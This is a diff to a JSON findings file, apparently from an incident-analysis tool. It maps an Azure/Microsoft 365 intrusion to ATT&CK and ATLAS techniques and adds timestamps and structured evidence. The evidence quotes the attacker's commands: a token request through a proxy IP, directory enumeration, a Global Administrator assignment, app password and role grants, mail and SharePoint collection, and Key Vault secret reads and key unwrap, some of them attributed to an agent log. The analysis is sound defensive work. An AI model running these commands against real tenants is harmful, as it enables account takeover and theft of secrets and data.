@@ -6,9 +6,18 @@
     "indicator": null,
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": "T1098.001",
     "atlas": null,
-    "evidence": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:10:00Z",
+        "file": "20261015_091000_step03_escalate.ps1",
+        "line": 3,
+        "text": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}'"
+      }
+    ]
   },
   {
     "finding": "AppRoleAssignment",
@@ -17,9 +26,24 @@
     "indicator": null,
     "files": "20261015_091000_step03_escalate.ps1, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": "T1098.003",
     "atlas": null,
-    "evidence": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant (20261015_091000_step03_escalate.ps1:5)\nPOST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:10:00Z",
+        "file": "20261015_091000_step03_escalate.ps1",
+        "line": 5,
+        "text": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant"
+      },
+      {
+        "time": "2026-10-15T09:35:00Z",
+        "file": "agent_20261015_093500.jsonl",
+        "line": null,
+        "text": "POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments"
+      }
+    ]
   },
   {
     "finding": "GlobalAdministratorAssignment",
@@ -28,9 +52,18 @@
     "indicator": null,
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": "T1098.003",
     "atlas": null,
-    "evidence": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member (20261015_091000_step03_escalate.ps1:4)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:10:00Z",
+        "file": "20261015_091000_step03_escalate.ps1",
+        "line": 4,
+        "text": "Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member"
+      }
+    ]
   },
   {
     "finding": "KeyVaultKeyUnwrap",
@@ -39,9 +72,18 @@
     "indicator": null,
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": "T1555.006",
     "atlas": null,
-    "evidence": "curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\" (20261015_093000_step05_vault.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:30:00Z",
+        "file": "20261015_093000_step05_vault.sh",
+        "line": 8,
+        "text": "curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\""
+      }
+    ]
   },
   {
     "finding": "KeyVaultSecretRead",
@@ -50,9 +92,30 @@
     "indicator": null,
     "files": "20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": "T1555.006",
     "atlas": null,
-    "evidence": "az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)\ncurl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)\naz keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:30:00Z",
+        "file": "20261015_093000_step05_vault.sh",
+        "line": 4,
+        "text": "az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt"
+      },
+      {
+        "time": "2026-10-15T09:30:00Z",
+        "file": "20261015_093000_step05_vault.sh",
+        "line": 7,
+        "text": "curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt"
+      },
+      {
+        "time": "2026-10-15T09:35:00Z",
+        "file": "agent_20261015_093500.jsonl",
+        "line": null,
+        "text": "az keyvault secret show --vault-name finvault --name api-key"
+      }
+    ]
   },
   {
     "finding": "TokenRequest",
@@ -61,9 +124,24 @@
     "indicator": null,
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": "T1078.004",
     "atlas": "AML.T0012",
-    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)\naz login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:00:00Z",
+        "file": "20261015_090000_step01_token.sh",
+        "line": 5,
+        "text": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin..."
+      },
+      {
+        "time": "2026-10-15T09:00:00Z",
+        "file": "20261015_090000_step01_token.sh",
+        "line": 8,
+        "text": "az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\""
+      }
+    ]
   },
   {
     "finding": "Domain",
@@ -72,6 +150,8 @@
     "indicator": "corpvault.vault.azure.net",
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -83,6 +163,8 @@
     "indicator": "finvault.vault.azure.net",
     "files": "agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:35:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -94,6 +176,8 @@
     "indicator": "graph.microsoft.com",
     "files": "20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_091000_step03_escalate.ps1, 20261015_092000_step04_collect.py, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -105,6 +189,8 @@
     "indicator": "login.microsoftonline.com",
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -116,6 +202,8 @@
     "indicator": "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token",
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -127,6 +215,8 @@
     "indicator": "11111111-2222-4333-8444-555555555555",
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -138,6 +228,8 @@
     "indicator": "62e90394-69f5-4237-9190-012177145e10",
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -149,6 +241,8 @@
     "indicator": "66666666-7777-4888-9999-000000000000",
     "files": "20261015_090000_step01_token.sh, 20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -160,6 +254,8 @@
     "indicator": "9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d",
     "files": "20261015_091000_step03_escalate.ps1, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -171,6 +267,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword",
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -182,6 +280,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/",
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -193,6 +293,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments",
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -204,6 +306,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments",
     "files": "agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:35:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -215,6 +319,8 @@
     "indicator": "144.172.64.128",
     "files": "20261015_090000_step01_token.sh, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -226,6 +332,8 @@
     "indicator": "144.172.64.60",
     "files": "agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:35:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -237,6 +345,8 @@
     "indicator": "https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4",
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -248,6 +358,8 @@
     "indicator": "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4",
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -259,6 +371,8 @@
     "indicator": "https://finvault.vault.azure.net/keys?api-version=7.4",
     "files": "agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:35:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -270,6 +384,8 @@
     "indicator": "https://graph.microsoft.com/.default",
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -281,6 +397,8 @@
     "indicator": "http://144.172.64.128:8080",
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -292,6 +410,8 @@
     "indicator": null,
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": "TA0006",
     "atlas": "AML.TA0013",
     "evidence": null
@@ -303,6 +423,8 @@
     "indicator": null,
     "files": "20261015_090000_step01_token.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:00:00Z",
     "attack": "TA0001",
     "atlas": "AML.TA0004",
     "evidence": null
@@ -314,6 +436,8 @@
     "indicator": null,
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": "TA0003",
     "atlas": "AML.TA0006",
     "evidence": null
@@ -325,6 +449,8 @@
     "indicator": null,
     "files": "20261015_091000_step03_escalate.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:10:00Z",
+    "last": "2026-10-15T09:10:00Z",
     "attack": "TA0004",
     "atlas": "AML.TA0012",
     "evidence": null
@@ -336,9 +462,18 @@
     "indicator": null,
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": "T1114.002",
     "atlas": "AML.T0126",
-    "evidence": "mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers) (20261015_092000_step04_collect.py:8)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:20:00Z",
+        "file": "20261015_092000_step04_collect.py",
+        "line": 8,
+        "text": "mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers)"
+      }
+    ]
   },
   {
     "finding": "SharePointEnumeration",
@@ -347,9 +482,24 @@
     "indicator": null,
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": "T1213.002",
     "atlas": "AML.T0126, AML.T0036",
-    "evidence": "sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers) (20261015_092000_step04_collect.py:10)\ndrive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers) (20261015_092000_step04_collect.py:11)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:20:00Z",
+        "file": "20261015_092000_step04_collect.py",
+        "line": 10,
+        "text": "sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers)"
+      },
+      {
+        "time": "2026-10-15T09:20:00Z",
+        "file": "20261015_092000_step04_collect.py",
+        "line": 11,
+        "text": "drive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers)"
+      }
+    ]
   },
   {
     "finding": "TeamsMessageAccess",
@@ -358,9 +508,18 @@
     "indicator": null,
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": "T1213.005",
     "atlas": "AML.T0126, AML.T0036",
-    "evidence": "chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers) (20261015_092000_step04_collect.py:9)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:20:00Z",
+        "file": "20261015_092000_step04_collect.py",
+        "line": 9,
+        "text": "chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers)"
+      }
+    ]
   },
   {
     "finding": "Domain",
@@ -369,6 +528,8 @@
     "indicator": "corp.example",
     "files": "20261015_092000_step04_collect.py, directory_20261015_090530.txt",
     "attribution": null,
+    "first": "2026-10-15T09:05:30Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -380,6 +541,8 @@
     "indicator": "corp.sharepoint.com",
     "files": "collect_20261015_092040.txt",
     "attribution": null,
+    "first": "2026-10-15T09:20:40Z",
+    "last": "2026-10-15T09:20:40Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -391,6 +554,8 @@
     "indicator": "alice@corp.example",
     "files": "20261015_092000_step04_collect.py, directory_20261015_090530.txt",
     "attribution": null,
+    "first": "2026-10-15T09:05:30Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -402,6 +567,8 @@
     "indicator": "bob@corp.example",
     "files": "20261015_092000_step04_collect.py, directory_20261015_090530.txt",
     "attribution": null,
+    "first": "2026-10-15T09:05:30Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -413,6 +580,8 @@
     "indicator": "https://graph.microsoft.com/v1.0",
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -424,6 +593,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/sites/root/drives",
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -435,6 +606,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/sites?search=*",
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -446,6 +619,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/users/",
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -457,6 +632,8 @@
     "indicator": "https://corp.sharepoint.com/sites/hr",
     "files": "collect_20261015_092040.txt",
     "attribution": null,
+    "first": "2026-10-15T09:20:40Z",
+    "last": "2026-10-15T09:20:40Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -468,6 +645,8 @@
     "indicator": null,
     "files": "20261015_092000_step04_collect.py",
     "attribution": null,
+    "first": "2026-10-15T09:20:00Z",
+    "last": "2026-10-15T09:20:00Z",
     "attack": "TA0009",
     "atlas": "AML.TA0009",
     "evidence": null
@@ -479,9 +658,18 @@
     "indicator": null,
     "files": "20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": "T1580",
     "atlas": "AML.T0075",
-    "evidence": "az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:30:00Z",
+        "file": "20261015_093000_step05_vault.sh",
+        "line": 2,
+        "text": "az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt"
+      }
+    ]
   },
   {
     "finding": "GraphDirectoryEnumeration",
@@ -490,9 +678,36 @@
     "indicator": null,
     "files": "20261015_090500_step02_recon.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:05:00Z",
+    "last": "2026-10-15T09:05:00Z",
     "attack": "T1087.004, T1069.003",
     "atlas": "AML.T0075",
-    "evidence": "Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nInvoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\" (20261015_090500_step02_recon.ps1:3)\nInvoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\" (20261015_090500_step02_recon.ps1:4)\nGet-MgApplication -All (20261015_090500_step02_recon.ps1:5)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:05:00Z",
+        "file": "20261015_090500_step02_recon.ps1",
+        "line": 2,
+        "text": "Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt"
+      },
+      {
+        "time": "2026-10-15T09:05:00Z",
+        "file": "20261015_090500_step02_recon.ps1",
+        "line": 3,
+        "text": "Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\""
+      },
+      {
+        "time": "2026-10-15T09:05:00Z",
+        "file": "20261015_090500_step02_recon.ps1",
+        "line": 4,
+        "text": "Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\""
+      },
+      {
+        "time": "2026-10-15T09:05:00Z",
+        "file": "20261015_090500_step02_recon.ps1",
+        "line": 5,
+        "text": "Get-MgApplication -All"
+      }
+    ]
   },
   {
     "finding": "KeyVaultKeyEnumeration",
@@ -501,9 +716,24 @@
     "indicator": null,
     "files": "20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-15T09:30:00Z",
+    "last": "2026-10-15T09:35:00Z",
     "attack": "T1580",
     "atlas": "AML.T0075",
-    "evidence": "az keyvault key list --vault-name \"$v\" -o tsv (20261015_093000_step05_vault.sh:5)\nGET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-15T09:30:00Z",
+        "file": "20261015_093000_step05_vault.sh",
+        "line": 5,
+        "text": "az keyvault key list --vault-name \"$v\" -o tsv"
+      },
+      {
+        "time": "2026-10-15T09:35:00Z",
+        "file": "agent_20261015_093500.jsonl",
+        "line": null,
+        "text": "GET https://finvault.vault.azure.net/keys?api-version=7.4"
+      }
+    ]
   },
   {
     "finding": "GraphEndpoint",
@@ -512,6 +742,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/directoryRoles",
     "files": "20261015_090500_step02_recon.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:05:00Z",
+    "last": "2026-10-15T09:05:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -523,6 +755,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/servicePrincipals?",
     "files": "20261015_090500_step02_recon.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:05:00Z",
+    "last": "2026-10-15T09:05:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -534,6 +768,8 @@
     "indicator": "https://graph.microsoft.com/v1.0/users?",
     "files": "20261015_090500_step02_recon.ps1",
     "attribution": null,
+    "first": "2026-10-15T09:05:00Z",
+    "last": "2026-10-15T09:05:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -545,6 +781,8 @@
     "indicator": null,
     "files": "20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_093000_step05_vault.sh",
     "attribution": null,
+    "first": "2026-10-15T09:00:00Z",
+    "last": "2026-10-15T09:30:00Z",
     "attack": "TA0007",
     "atlas": "AML.TA0008",
     "evidence": null
